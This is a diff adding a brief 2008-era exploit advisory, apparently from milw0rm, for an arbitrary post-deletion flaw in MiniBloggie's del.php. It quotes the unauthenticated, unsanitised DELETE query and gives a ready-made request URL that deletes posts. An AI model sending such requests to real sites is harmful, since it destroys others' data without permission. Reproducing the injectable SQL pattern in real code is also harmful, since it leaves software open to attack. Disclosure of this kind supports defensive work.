@@ -1,0 +1,16 @@
+# MiniBloggie Arbitrary Delete Post Vulnerability
+# Author: Cod3rZ
+# Site: http://cod3rz.helloweb.eu
+# PoC:
+#  if (isset($_GET['post_id'])) $post_id = $_GET['post_id'];
+#  if (isset($_GET['confirm'])) $confirm = $_GET['confirm'];
+# [...]
+# elseif ($confirm=="yes") {
+# [...]
+# $sql = "DELETE FROM blogdata WHERE post_id=$post_id";
+# $query = mysql_query($sql) or die("Cannot query the database.<br>" . mysql_error());
+# Vuln: http://site/del.php?post_id=[postid]&confirm=yes
+# Ex:   http://127.0.0.1/del.php?post_id=1&confirm=yes
+# Visit http://devilsnight.altervista.org
+
+# milw0rm.com [2008-05-08]
